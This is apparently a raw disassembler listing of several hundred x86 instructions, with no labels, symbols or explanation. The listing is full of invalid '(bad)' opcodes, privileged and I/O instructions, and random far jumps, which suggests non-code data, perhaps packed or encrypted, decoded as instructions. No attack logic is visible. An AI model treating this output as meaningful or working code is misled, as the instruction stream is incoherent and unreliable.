  4221fc:	retf   0xb35
  4221ff:	das    
  422200:	pop    es
  422201:	mov    dl,0x66
  422203:	fidivr DWORD PTR [ebx-0x9]
  422206:	inc    esp
  422207:	or     esp,esi
  422209:	xchg   edi,eax
  42220a:	ss sar BYTE PTR fs:[ebp-0x7b],0x7
  422210:	icebp  
  422211:	pop    eax
  422212:	(bad)
  422216:	aad    0xf6
  422218:	das    
  422219:	int3   
  42221a:	retf   
  42221b:	ret    0x8e4f
  42221e:	sahf   
  42221f:	xchg   esp,eax
  422220:	fnstcw WORD PTR [esi]
  422222:	lea    edx,[edi-0x2d]
  422225:	out    0x9a,eax
  422227:	leave  
  422228:	hlt    
  422229:	jg     0x422296
  42222b:	add    ah,BYTE PTR [eax-0x21]
  42222e:	ins    DWORD PTR es:[edi],dx
  42222f:	dec    eax
  422230:	inc    ebp
  422231:	jnp    0x422298
  422233:	xor    al,0xe9
  422235:	push   es
  422236:	cwde   
  422237:	xlat   BYTE PTR ds:[ebx]
  422238:	jno    0x422247
  42223a:	in     al,0x12
  42223c:	(bad)  
  42223d:	inc    ebx
  42223e:	cmp    BYTE PTR [esi+0x156966b5],ch
  422244:	cdq    
  422245:	xchg   ecx,eax
  422246:	push   edx
  422247:	test   eax,0x5d405706
  42224c:	inc    esp
  42224d:	jb     0x42223c
  42224f:	sbb    DWORD PTR [esi],eax
  422251:	mov    dh,BYTE PTR [edx+0x29404f30]
  422257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422258:	mov    ds:0xffe016d2,al
  42225d:	ret    0x7ea
  422260:	hlt    
  422261:	mov    esp,0x22b1c350
  422266:	pop    esi
  422267:	push   ecx
  422268:	addr16 loope 0x4221f4
  42226b:	mov    al,ds:0x718cc01c
  422270:	jp     0x422203
  422272:	ss sbb edx,ecx
  422275:	push   edx
  422276:	xlat   BYTE PTR ds:[ebx]
  422277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422278:	call   0xbcbf1c72
  42227d:	push   edi
  42227e:	jmp    0x10d4:0x899bef1c
  422285:	dec    esi
  422286:	mov    BYTE PTR ds:0xab98e7a5,dh
  42228c:	es cmp al,0x60
  42228f:	inc    esi
  422290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422291:	xor    DWORD PTR [ebx],esi
  422293:	in     eax,dx
  422294:	fld    DWORD PTR [edi-0x631cc048]
  42229a:	xchg   ebp,eax
  42229b:	mov    esp,0x9d1758b3
  4222a0:	inc    ebx
  4222a1:	jbe    0x42222c
  4222a3:	int    0x83
  4222a5:	mov    ebp,0x5d32f0f
  4222aa:	xor    eax,0xfc3b67d9
  4222af:	out    dx,eax
  4222b0:	or     eax,0x301f0fd0
  4222b5:	push   0x71bacf1e
  4222ba:	sbb    esi,DWORD PTR [edx]
  4222bc:	and    DWORD PTR [edi-0x34],edi
  4222bf:	repz add BYTE PTR [eax],al
  4222c2:	gs mov ah,0x18
  4222c5:	fcompp 
  4222c7:	(bad)  
  4222c8:	out    0xbf,eax
  4222ca:	gs mov ah,0x46
  4222cd:	not    BYTE PTR ds:0x660cd536
  4222d3:	xchg   edi,eax
  4222d4:	add    DWORD PTR [eax],eax
  4222d6:	add    eax,DWORD PTR es:[eax]
  4222d9:	add    BYTE PTR [esi-0x42c21b3d],ch
  4222df:	xor    BYTE PTR [eax-0x41],dl
  4222e2:	jae    0x422281
  4222e4:	cmp    ebx,esp
  4222e6:	adc    DWORD PTR [ebp+0x59d123eb],edx
  4222ec:	sbb    esp,ebx
  4222ee:	das    
  4222ef:	enter  0xb4c4,0x91
  4222f3:	dec    eax
  4222f4:	stc    
  4222f5:	nop
  4222f6:	stos   BYTE PTR es:[edi],al
  4222f7:	(bad)  
  4222f8:	loopne 0x4222cf
  4222fa:	jl     0x422310
  4222fc:	dec    eax
  4222fd:	stc    
  4222fe:	jp     0x42230d
  422300:	xchg   edi,eax
  422301:	cli    
  422302:	pop    ds
  422303:	mov    ebp,0xed508d2
  422308:	(bad)
  42230b:	and    eax,0x25257f6e
  422310:	push   edx
  422311:	xor    DWORD PTR [ebx+0x63848ab],edi
  422317:	nop
  422318:	push   ebp
  422319:	rcr    DWORD PTR [eax],cl
  42231b:	inc    eax
  42231c:	lahf   
  42231d:	ret    0x8b5a
  422320:	fcomip st,st(0)
  422322:	stc    
  422323:	pop    esi
  422324:	pop    eax
  422325:	leave  
  422326:	loope  0x422364
  422328:	cmp    dh,BYTE PTR [ebp+0x3c]
  42232b:	stos   BYTE PTR es:[edi],al
  42232c:	dec    eax
  42232d:	int    0x71
  42232f:	pop    es
  422330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422331:	pop    ecx
  422332:	loope  0x4222b5
  422334:	mov    ds:0x22a94776,al
  422339:	adc    eax,esi
  42233b:	add    WORD PTR [edx-0x4f],ax
  42233f:	retf   0xfd37
  422342:	in     al,dx
  422343:	or     DWORD PTR [esi],edx
  422345:	mov    dl,0xce
  422347:	xchg   ecx,eax
  422348:	add    eax,DWORD PTR [eax+0x7f3641dd]
  42234e:	div    DWORD PTR [eax-0x39d8b5f9]
  422354:	pop    ecx
  422355:	(bad)  
  422356:	pop    eax
  422357:	ins    DWORD PTR es:[edi],dx
  422358:	xchg   ebp,eax
  422359:	in     al,dx
  42235a:	popa   
  42235b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42235c:	data16 loopne 0x4223bf
  42235f:	mov    eax,0xe533e219
  422364:	and    esp,DWORD PTR [edi]
  422366:	mov    ds:0x3e1ae8ba,al
  42236b:	add    BYTE PTR [esi-0x67],bh
  42236e:	mov    al,fs:0x5a6f1ac9
  422374:	pop    ebp
  422375:	jl     0x4223a4
  422377:	adc    BYTE PTR [ecx-0x657a8d7f],ah
  42237d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42237e:	fs mov cl,0xf1
  422381:	rcr    DWORD PTR [ebx+0x7b04585c],1
  422387:	add    al,0x91
  422389:	test   al,0xc6
  42238b:	sahf   
  42238c:	sbb    al,0x6b
  42238e:	cli    
  42238f:	(bad)  
  422390:	sub    ch,BYTE PTR [ebx]
  422392:	in     eax,0xe6
  422394:	jmp    0x4223dc
  422396:	jnp    0x422391
  422398:	mov    ds:0xd6623e9e,al
  42239d:	mov    eax,ds:0x62149078
  4223a2:	mov    eax,ds:0x253e2ed3
  4223a7:	mov    ch,0xa6
  4223a9:	mov    ah,0xcf
  4223ab:	sub    eax,0x507391a7
  4223b0:	aam    0x62
  4223b2:	scas   eax,DWORD PTR es:[edi]
  4223b3:	les    edi,FWORD PTR [esi]
  4223b5:	add    dl,bl
  4223b7:	dec    esp
  4223b8:	or     eax,0xbb2dd714
  4223bd:	push   ss
  4223be:	inc    edi
  4223bf:	call   0xf09f:0xd1890f8a
  4223c6:	sar    DWORD PTR [eax+0x42],cl
  4223c9:	lock add cl,bh
  4223cc:	shl    BYTE PTR ss:[ebp+0x23],1
  4223d0:	in     al,dx
  4223d1:	loope  0x422396
  4223d3:	sti    
  4223d4:	in     al,0x30
  4223d6:	repz pop ss
  4223d8:	cmp    ebx,ecx
  4223da:	mov    al,ds:0x2cc15252
  4223df:	xchg   esi,eax
  4223e0:	mov    ds:0x9c3e2283,al
  4223e5:	pusha  
  4223e6:	shr    BYTE PTR [edx],1
  4223e8:	pusha  
  4223e9:	jmp    0x84c8840b
  4223ee:	mov    eax,ds:0x42104baf
  4223f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223f4:	pop    esi
  4223f5:	push   esp
  4223f6:	dec    edx
  4223f7:	pop    eax
  4223f8:	out    dx,eax
  4223f9:	dec    ecx
  4223fa:	aad    0xa0
  4223fc:	or     eax,0xc98c992d
  422401:	xchg   esp,eax
  422402:	stos   BYTE PTR es:[edi],al
  422403:	out    0x8e,al
  422405:	mov    al,ds:0x1ce0d1b0
  42240a:	sub    ah,dh
  42240c:	xor    DWORD PTR [edx+edi*4+0x40bffe42],0xd4ef4a5a
  422417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422418:	neg    BYTE PTR [eax]
  42241a:	mov    al,BYTE PTR [edi+ecx*4-0x394fa2bd]
  422421:	fcmovbe st,st(4)
  422423:	xchg   esi,eax
  422424:	dec    edx
  422425:	cwde   
  422426:	xchg   bl,bh
  422428:	sti    
  422429:	xor    dl,BYTE PTR ss:[esi-0x31]
  42242d:	push   edx
  42242e:	push   edx
  42242f:	fldcw  WORD PTR [ecx]
  422431:	rol    dl,0x63
  422434:	iret   
  422435:	call   DWORD PTR [ebp+eiz*2+0x6b]
  422439:	dec    edi
  42243a:	daa    
  42243b:	dec    eax
  42243c:	(bad)  
  42243d:	pop    edx
  42243e:	add    cl,BYTE PTR [ebp-0x44669a90]
  422444:	sbb    dh,cl
  422446:	pop    ss
  422447:	jge    0x42249b
  422449:	fldcw  WORD PTR [esi]
  42244b:	(bad)  
  42244c:	adc    bh,BYTE PTR [ebx+0x56]
  42244f:	inc    eax
  422450:	stos   DWORD PTR es:[edi],eax
  422451:	and    dh,bh
  422453:	pop    ecx
  422454:	sbb    DWORD PTR gs:[ecx-0x60],0x6f
  422459:	adc    BYTE PTR [ebp+esi*2+0x74d65e01],bl
  422460:	shl    DWORD PTR [edi-0x304fd0b5],1
  422466:	pop    ss
  422467:	js     0x42249f
  422469:	lods   eax,DWORD PTR ds:[esi]
  42246a:	pop    edi
  42246b:	retf   
  42246c:	scas   eax,DWORD PTR es:[edi]
  42246d:	jmp    0x4224b6
  42246f:	addr16 int3 
  422471:	jge    0x422455
  422473:	push   esp
  422474:	pop    ebx
  422475:	scas   al,BYTE PTR es:[edi]
  422476:	sbb    al,0xe3
  422478:	imul   esp,DWORD PTR [esi+0x30],0xe94dea1d
  42247f:	repnz adc ebx,ebp
  422482:	cmp    eax,0x752da839
  422487:	inc    edi
  422488:	inc    edi
  422489:	inc    edi
  42248a:	pop    edi
  42248b:	mov    BYTE PTR [esi],al
  42248d:	inc    ebp
  42248e:	fs js  0x4224f7
  422491:	(bad)  
  422492:	xchg   ebx,eax
  422493:	pop    ds
  422494:	out    dx,al
  422495:	or     eax,0xa6485b68
  42249a:	(bad)  
  42249b:	fmul   DWORD PTR [edi]
  42249d:	hlt    
  42249e:	lahf   
  42249f:	stc    
  4224a0:	or     dh,cl
  4224a2:	pusha  
  4224a3:	pop    ebx
  4224a4:	cmp    ah,BYTE PTR [ecx]
  4224a6:	and    ebx,edi
  4224a8:	jmp    0x42243d
  4224aa:	pop    ecx
  4224ab:	pop    esp
  4224ac:	out    dx,al
  4224ad:	cs and al,0xea
  4224b0:	mov    cl,0x64
  4224b2:	add    DWORD PTR [ecx],0xea96905f
  4224b8:	aaa    
  4224b9:	xchg   BYTE PTR [esi-0x594333b],al
  4224bf:	cmp    eax,ebx
  4224c1:	imul   esp,DWORD PTR [ecx],0xe00cc525
  4224c7:	test   DWORD PTR [ebp-0x17],ecx
  4224ca:	stc    
  4224cb:	add    DWORD PTR ds:0x1b9c3f32,0xffffffb5
  4224d2:	daa    
  4224d3:	je     0x42252a
  4224d5:	rcr    DWORD PTR [ecx],1
  4224d7:	int    0xe5
  4224d9:	or     al,0x9c
  4224db:	loope  0x42254a
  4224dd:	arpl   WORD PTR [edx-0x6fb77856],bp
  4224e3:	mov    ebx,0x96a58d9b
  4224e8:	pushf  
  4224e9:	add    esp,DWORD PTR [ecx+0x12]
  4224ec:	jo     0x42253b
  4224ee:	and    bh,BYTE PTR [esi+0x43]
  4224f1:	mov    ds:0xd3115131,al
  4224f6:	cmp    dh,BYTE PTR [edx-0x6f]
  4224f9:	das    
  4224fa:	xlat   BYTE PTR ds:[ebx]
  4224fb:	cmp    ebp,DWORD PTR [eax+0x9716bad]
  422501:	pushf  
  422502:	hlt    
  422503:	(bad)  
  422504:	pusha  
  422505:	daa    
  422506:	add    al,BYTE PTR [edx+0x4daf95f3]
  42250c:	pusha  
  42250d:	cs icebp 
  42250f:	popf   
  422510:	scas   eax,DWORD PTR es:[edi]
  422511:	xor    eax,ebx
  422513:	ins    BYTE PTR es:[edi],dx
  422514:	(bad)  
  422515:	(bad)  
  422516:	dec    esp
  422517:	jbe    0x422588
  422519:	lea    esi,[edi+0x74]
  42251c:	sbb    eax,0x111c539
  422521:	sub    esi,DWORD PTR [esi+0x39db9d63]
  422527:	popf   
  422528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422529:	mov    ds:0x1fe92e61,eax
  42252e:	mov    eax,0x2b26b988
  422533:	push   0x224bffbc
  422538:	stos   BYTE PTR es:[edi],al
  422539:	pop    eax
  42253a:	into   
  42253b:	or     dh,dh
  42253d:	sub    al,0x70
  42253f:	jmp    0x6a1396d5
  422544:	cmp    BYTE PTR [esi+0x42],cl
  422547:	adc    DWORD PTR [ebx],eax
  422549:	aaa    
  42254a:	sbb    al,0x1
  42254c:	lds    eax,FWORD PTR [eax+0xfc4f0a]
  422552:	ins    BYTE PTR es:[edi],dx
  422553:	pop    esi
  422554:	dec    ebp
  422555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422556:	out    dx,al
  422557:	sub    DWORD PTR [esi-0x66],esi
  42255a:	inc    edx
  42255b:	jmp    0xcc81:0xbe83182f
  422562:	and    al,0x84
  422564:	or     al,0xd6
  422566:	push   ds
  422567:	sub    eax,DWORD PTR [ebx+0x4fe7b59b]
  42256d:	adc    edx,DWORD PTR ds:0x98945aec
  422573:	mov    cl,0x86
  422575:	dec    esp
  422576:	nop
  422577:	add    esp,ebx
  422579:	(bad)  
  42257a:	dec    esi
  42257b:	mov    ah,0x53
  42257d:	mov    ebx,0x7a56875
  422582:	clc    
  422583:	sub    ebx,esi
  422585:	inc    esp
  422586:	mov    eax,ds:0xa2d46f39
  42258b:	mov    al,0xe
  42258d:	ffree  st(1)
  42258f:	retf   
  422590:	mov    esi,0xe27b0b48
  422595:	nop
  422596:	inc    DWORD PTR [edx-0x7b467a9]
  42259c:	cmp    ecx,DWORD PTR [edx]
  42259e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42259f:	sub    BYTE PTR [ecx],ch
  4225a1:	out    dx,al
  4225a2:	fcomp  DWORD PTR [edi+0xc]
  4225a5:	sub    eax,ecx
  4225a7:	push   ds
  4225a8:	enter  0x85a5,0x86
  4225ac:	mov    edx,0xc805b0
  4225b1:	cdq    
  4225b2:	and    DWORD PTR [esi],edi
  4225b4:	test   edi,0x2a9d1e40
  4225ba:	dec    esp
  4225bb:	sahf   
  4225bc:	arpl   WORD PTR [ebp-0x44fac676],ax
  4225c2:	pmaxub mm4,mm4
  4225c5:	add    al,0x6
  4225c7:	call   0x8d0e:0x68d81eba
  4225ce:	(bad)
  4225d1:	out    0x4e,al
  4225d3:	enter  0xdb7a,0xe5
  4225d7:	es sbb bh,ch
  4225da:	mov    eax,0x5c844512
  4225df:	xsave  es:[esp+ebp*2+0x6c72bc53]
  4225e8:	push   ebp
  4225e9:	mov    edi,0x6fba7a75
  4225ee:	daa    
  4225ef:	dec    esi
  4225f0:	adc    DWORD PTR [ebp+eiz*8-0x402ebd4],esp
  4225f7:	fs or  eax,0xaa45a4d4
  4225fd:	mov    ds,WORD PTR [edx+0x120000d5]
  422603:	fsub   DWORD PTR [ebx+0x72]
  422606:	jmp    0x422603
  422608:	adc    edi,eax
  42260a:	sub    edi,DWORD PTR [ebx+0x773988f7]
  422610:	xchg   ebp,eax
  422611:	inc    edi
  422612:	mov    WORD PTR [edx+0x3260001],ds
  422618:	add    BYTE PTR [eax],al
  42261a:	rcr    BYTE PTR [edx+ebp*4+0x69],0x94
  42261f:	fs jg  0x4225de
  422622:	add    eax,0x6e7fc752
  422627:	dec    edx
  422628:	push   0xffffffb2
  42262a:	fdiv   st,st(0)
  42262c:	mov    eax,0x3a8dc48f
  422631:	iret   
  422632:	mov    eax,0xbd54172c
  422637:	mov    esi,0x788aed33
  42263c:	pop    es
  42263d:	cli    
  42263e:	in     eax,0x69
  422640:	pop    edi
  422641:	jno    0x422689
  422643:	fcomp  QWORD PTR [edi]
  422645:	imul   edx,DWORD PTR [bx+di+0x76],0x4fe52229
  42264d:	xor    ecx,ecx
  42264f:	xor    dh,BYTE PTR [ecx+edi*8]
  422652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422653:	aas    
  422654:	imul   eax,DWORD PTR [eax+0x10284bd4],0xf6647afe
  42265e:	adc    BYTE PTR [edx+0x7f],ch
  422661:	sbb    BYTE PTR es:[ebp+0x59],ch
  422665:	jle    0x422652
  422667:	jp     0x4226da
  422669:	mov    eax,0xeb0b5374
  42266e:	(bad)  
  42266f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422670:	rcr    DWORD PTR [ecx+ebx*2],cl
  422673:	data16 fmul QWORD PTR [ebp+0x49866182]
  42267a:	xchg   edx,eax
  42267b:	shl    BYTE PTR [ebx+0x430afce8],cl
  422681:	cvtpi2ps xmm4,QWORD PTR [ebx+esi*8+0x69]
  422686:	lods   al,BYTE PTR ds:[esi]
  422687:	ds enter 0xdbd6,0xc
  42268c:	lods   eax,DWORD PTR ds:[esi]
  42268d:	pop    edx
  42268e:	or     esi,ecx
  422690:	ds stos DWORD PTR es:[edi],eax
  422692:	adc    al,0x55
  422694:	pop    es
  422695:	add    BYTE PTR [eax+0x20],bh
  422698:	add    BYTE PTR [ebx],0xe0
  42269b:	push   ebp
  42269c:	jb     0x4226b0
  42269e:	loope  0x4226f3
  4226a0:	fild   WORD PTR [ebx+0x7d253a89]
  4226a6:	mov    WORD PTR [edx-0xd],cs
  4226a9:	rcl    BYTE PTR [eax-0x22],0xa1
  4226ad:	mov    ds:0xb1276256,eax
  4226b2:	cdq    
  4226b3:	lds    ebp,FWORD PTR [ebx+0x4d]
  4226b6:	imul   edi,esp,0xf2173879
  4226bc:	xbegin 0x8484c205
  4226c2:	pop    ebx
  4226c3:	fcomp  st(0)
  4226c5:	mov    ch,BYTE PTR [ebp+0x62]
  4226c8:	jl     0x422677
  4226ca:	push   ds
  4226cb:	stos   BYTE PTR es:[edi],al
  4226cc:	(bad)  
  4226cd:	shr    DWORD PTR [ebp-0x4d38a488],1
  4226d3:	adc    DWORD PTR [ebp+0x5e913742],edi
  4226d9:	stos   BYTE PTR es:[edi],al
  4226da:	das    
  4226db:	retf   0x4f35
  4226de:	cld    
  4226df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226e0:	dec    eax
  4226e1:	clc    
  4226e2:	push   esp
  4226e3:	push   ebp
  4226e4:	dec    edx
  4226e5:	bnd jmp 0x7c2c5a12
  4226eb:	jne    0x422745
  4226ed:	mov    ch,0x6
  4226ef:	or     dh,BYTE PTR [eax-0x4fc5ad6c]
  4226f5:	jnp    0x4226b8
  4226f7:	and    DWORD PTR [si-0x74],ecx
  4226fb:	aas    
  4226fc:	test   BYTE PTR [edx],bh
  4226fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226ff:	xor    eax,0xd63a2d6c
  422704:	pop    esi
  422705:	pop    ss
  422706:	push   ebp
  422707:	aam    0xac
  422709:	dec    ebx
  42270a:	stos   DWORD PTR es:[edi],eax
  42270b:	sbb    BYTE PTR [eax+ecx*2+0x58],bl
  42270f:	pop    ss
  422710:	xor    al,0x48
  422712:	stos   DWORD PTR es:[edi],eax
  422713:	ror    BYTE PTR [eax-0x58],1
  422716:	jno    0x42269a
  422718:	std    
  422719:	mov    esp,DWORD PTR [edi]
  42271b:	out    0x2a,al
  42271d:	loop   0x4226dc
  42271f:	enter  0x8408,0x3d
  422723:	mov    cl,0x94
  422725:	pop    esp
  422726:	dec    eax
  422727:	hlt    
  422728:	(bad)  
  422729:	out    0x4b,eax
  42272b:	jno    0x4226de
  42272d:	ret    0x80ca
  422730:	xchg   esi,eax
  422731:	cmp    esi,DWORD PTR [edi+0x3b9ce402]
  422737:	or     dh,BYTE PTR [edx+0x3]
  42273a:	jl     0x4226cc
  42273c:	dec    ebp
  42273d:	imul   eax,DWORD PTR [ebx+esi*4-0x18719aa8],0xfffffff0
  422745:	inc    edi
  422746:	mov    al,0xd4
  422748:	daa    
  422749:	retf   0x56c
  42274c:	pop    eax
  42274d:	into   
  42274e:	(bad)  
  42274f:	dec    BYTE PTR [esi]
  422751:	xchg   edx,eax
  422752:	in     eax,0x1a
  422754:	sub    DWORD PTR [edi+0x62],esp
  422757:	shr    BYTE PTR [esi],cl
  422759:	and    DWORD PTR [ebx-0x6e],esi
  42275c:	jl     0x422716
  42275e:	sbb    BYTE PTR [ebx],dh
  422760:	sbb    DWORD PTR [ecx+0x64322da3],esp
  422766:	mov    ah,0xfb
  422768:	int    0x52
  42276a:	lahf   
  42276b:	add    DWORD PTR [ebx],eax
  42276d:	add    edx,DWORD PTR [eax-0x6aa67481]
  422773:	mov    al,0xbc
  422775:	cmp    DWORD PTR [edx+0x2a4027be],esp
  42277b:	addr16 xchg esi,eax
  42277d:	lods   al,BYTE PTR ds:[esi]
  42277e:	jge    0x4227f0
  422780:	mov    ds:0x7ac677d5,al
  422785:	ret    0x8084
  422788:	push   esp
  422789:	(bad)  
  42278a:	sbb    DWORD PTR [esi+esi*8],0xffffff9d
  42278e:	das    
  42278f:	cmp    esi,esi
  422791:	mov    bl,0x29
  422793:	repnz cdq 
  422795:	mov    ebx,DWORD PTR [edx]
  422797:	lds    ecx,FWORD PTR [edi]
  422799:	cli    
  42279a:	leave  
  42279b:	lahf   
  42279c:	mov    WORD PTR [ebp+0x52],ds
  42279f:	lahf   
  4227a0:	into   
  4227a1:	shrd   esp,edi,cl
  4227a4:	sbb    esi,DWORD PTR [esi-0x67]
  4227a7:	in     eax,dx
  4227a8:	jp     0x422826
  4227aa:	fnstsw WORD PTR [eax-0x61]
  4227ad:	or     BYTE PTR [eax+0x63],0x1c
  4227b1:	and    edi,DWORD PTR [ebp-0x5cbe915d]
  4227b7:	and    eax,0x3295b067
  4227bc:	loop   0x42275f
  4227be:	imul   esi,DWORD PTR [ebx],0x10
  4227c1:	inc    eax
  4227c2:	jmp    0x422809
  4227c4:	dec    esi
  4227c5:	adc    eax,0x253b6854
  4227ca:	iret   
  4227cb:	dec    esp
  4227cc:	clc    
  4227cd:	mov    ah,0xe5
  4227cf:	fisubr WORD PTR [esi]
  4227d1:	dec    esi
  4227d2:	js     0x4227f5
  4227d4:	jno    0x422758
  4227d6:	dec    eax
  4227d7:	sar    cl,0xa2
  4227da:	hlt    
  4227db:	pop    es
  4227dc:	cs ins DWORD PTR es:[edi],dx
  4227de:	jmp    0x55e31b7
  4227e3:	pusha  
  4227e4:	test   al,0xcd
  4227e6:	mov    dh,0xb3
  4227e8:	cs ds sar ch,0x99
  4227ed:	add    eax,0x93ad147c
  4227f2:	or     eax,0xcada5ca3
  4227f7:	rcr    ah,0x38
  4227fa:	mov    DWORD PTR [ecx],ebx
  4227fc:	pop    ds
  4227fd:	pop    edx
  4227fe:	repnz fadd QWORD PTR [esi]
  422801:	test   al,0xd5
  422803:	pop    eax
  422804:	inc    eax
  422805:	(bad)  
  422806:	pop    eax
  422807:	dec    edi
  422808:	add    al,0x2
  42280a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42280b:	inc    esp
  42280c:	fdiv   QWORD PTR [esi+0x20a16207]
  422812:	add    al,0xce
  422814:	retf   0xfbde
  422817:	jle    0x42279c
  422819:	aad    0x5a
  42281b:	fs mov ebx,0x1cc655ea
  422821:	daa    
  422822:	sub    eax,0x761a606e
  422827:	push   edi
  422828:	cwde   
  422829:	push   ecx
  42282a:	jnp    0x422896
  42282c:	mov    edx,0xac3a0ebb
  422831:	sub    eax,0xbc63e7aa
  422836:	xchg   ebp,eax
  422837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422838:	fmul   DWORD PTR [ebx+0x1f]
  42283b:	pop    esp
  42283c:	aad    0xc4
  42283e:	sub    ebx,DWORD PTR [edx]
  422840:	nop
  422841:	pusha  
  422842:	cli    
  422843:	(bad)  
  422844:	repnz and DWORD PTR [eax+0x35],ebp
  422848:	mov    dl,0x50
  42284a:	lds    eax,FWORD PTR [esi+0xe]
  42284d:	dec    edi
  42284e:	xor    dl,dl
  422850:	std    
  422851:	test   al,0x1b
  422853:	int    0xdf
  422855:	arpl   si,sp
  422857:	mov    ebp,0x6ade60c2
  42285c:	(bad)  
  42285d:	and    DWORD PTR [ebx],esi
  42285f:	ret    
  422860:	shr    DWORD PTR [ecx],1
  422862:	fnstcw WORD PTR [esi+0x1007a8f4]
  422868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422869:	cmp    dl,bh
  42286b:	and    eax,0xba90cacd
  422870:	les    ebx,FWORD PTR [eax+0x4f]
  422873:	xor    eax,0x5e564159
  422878:	or     eax,0x19d92e25
  42287d:	out    0x31,eax
  42287f:	pop    es
  422880:	imul   esp,DWORD PTR [edi+0x29],0xffffffa1
  422884:	sti    
  422885:	in     al,dx
  422886:	aad    0x22
  422888:	repz mov edx,0x502188e4
  42288e:	jp     0x4228e7
  422890:	les    ebp,FWORD PTR [ebp-0x66]
  422893:	daa    
  422894:	fist   DWORD PTR [ebp+0x4a906588]
  42289a:	(bad)  
  42289b:	out    0x77,al
  42289d:	call   0x4806:0x592caa17
  4228a4:	mov    al,0xfc
  4228a6:	jbe    0x4228c5
  4228a8:	lods   eax,DWORD PTR ds:[esi]
  4228a9:	xchg   BYTE PTR [edx+ebp*8-0x16ca314b],dl
  4228b0:	adc    ebp,0x77
  4228b3:	ins    BYTE PTR es:[edi],dx
  4228b4:	cmp    DWORD PTR [edi+ebp*2],eax
  4228b7:	jo     0x422887
  4228b9:	and    dh,BYTE PTR ds:0x20c7e86d
  4228bf:	inc    ebp
  4228c0:	add    BYTE PTR ds:0xb3162751,ah
  4228c6:	pop    esp
  4228c7:	outs   dx,DWORD PTR ds:[esi]
  4228c8:	outs   dx,BYTE PTR ds:[esi]
  4228c9:	xor    al,0x8f
  4228cb:	sbb    BYTE PTR [edi+0x2b],cl
  4228ce:	mov    ?,WORD PTR ds:0x97c78d16
  4228d4:	jo     0x4228bd
  4228d6:	push   ebp
  4228d7:	adc    eax,0x4b7c0155
  4228dc:	mov    esi,0x2c459818
  4228e1:	and    ah,al
  4228e3:	dec    edi
  4228e4:	and    al,0x4c
  4228e6:	and    BYTE PTR [edx-0x44],ah
  4228e9:	int3   
  4228ea:	les    edx,FWORD PTR [ebx-0x19]
  4228ed:	lods   al,BYTE PTR ds:[esi]
  4228ee:	fist   DWORD PTR [eax]
  4228f0:	ss int 0x4e
  4228f3:	jbe    0x422892
  4228f5:	pop    esi
  4228f6:	cmp    edi,esp
  4228f8:	sub    BYTE PTR [ebp-0xe11512b],0x3
  4228ff:	outs   dx,BYTE PTR ds:[esi]
  422900:	push   esp
  422901:	aaa    
  422902:	bound  esi,QWORD PTR [esi]
  422904:	shl    BYTE PTR [ebx+0x309076d],cl
  42290a:	test   eax,0x5a7427d1
  42290f:	and    dh,BYTE PTR [edx+0x68f410ae]
  422915:	jge    0x422942
  422917:	scas   al,BYTE PTR es:[edi]
  422918:	pop    ecx
  422919:	sbb    cl,BYTE PTR [ecx-0x2f]
  42291c:	sbb    al,0xb
  42291e:	cmp    al,0xee
  422920:	(bad)  [esp+ecx*4]
  422923:	push   eax
  422924:	mov    eax,ds:0xb02e693
  422929:	sub    al,0x94
  42292b:	repz pop eax
  42292d:	jbe    0x4228d5
  42292f:	inc    edx
  422930:	pop    eax
  422931:	cdq    
  422932:	cmp    ecx,DWORD PTR [ebp-0x5c]
  422935:	jge    0x422983
  422937:	mov    WORD PTR [eax-0x25],es
  42293a:	push   0xffffff92
  42293c:	mov    al,0x1c
  42293e:	in     al,0x97
  422940:	add    BYTE PTR [eax],al
  422942:	push   cs
  422943:	and    BYTE PTR [eax-0x404051c1],cl
  422949:	xor    DWORD PTR [ebx-0xa6d7643],edx
  42294f:	jecxz  0x422957
  422951:	lahf   
  422952:	mov    dl,0x9d
  422954:	add    DWORD PTR [eax],eax
  422956:	add    eax,DWORD PTR es:[eax]
  422959:	add    BYTE PTR [ebx-0x61],ah
  42295c:	push   es
  42295d:	stos   DWORD PTR es:[edi],eax
  42295e:	cmp    ebp,esi
  422960:	push   ebx
  422961:	pop    es
  422962:	lock jge 0x4229bf
  422965:	dec    ebx
  422966:	mov    al,0x85
  422968:	shl    DWORD PTR [edx+ebp*2],cl
  42296b:	sub    al,0x91
  42296d:	into   
  42296e:	int    0xf1
  422970:	ins    BYTE PTR es:[edi],dx
  422971:	adc    ecx,edi
  422973:	shl    BYTE PTR [edi],cl
  422975:	mov    dl,0x70
  422977:	xchg   BYTE PTR [esi],bl
  422979:	xor    al,0x65
  42297b:	cs das 
  42297d:	gs or  eax,0x582f6c86
  422983:	outs   dx,BYTE PTR ds:[esi]
  422984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422985:	mov    ch,0xdf
  422987:	stos   BYTE PTR es:[edi],al
  422988:	mov    dl,0x7c
  42298a:	add    ecx,edi
  42298c:	fs sub ebp,0x7f3ef3f7
  422993:	push   ebx
  422994:	sbb    cl,BYTE PTR ds:0xb0ad7b12
  42299a:	icebp  
  42299b:	cmp    al,0xe0
  42299d:	stos   DWORD PTR es:[edi],eax
  42299e:	in     al,dx
  42299f:	mov    edx,0xc8ee11ac
  4229a4:	fcom   DWORD PTR [ecx+0x7f]
  4229a7:	shl    DWORD PTR [esi-0x7a0c634],0xcb
  4229ae:	adc    DWORD PTR [eax-0x65a9a9ea],esp
  4229b4:	test   eax,0x9fd7a8c2
  4229b9:	push   ebx
  4229ba:	fimul  WORD PTR [esi]
  4229bc:	xchg   esi,eax
  4229bd:	jnp    0x4229c3
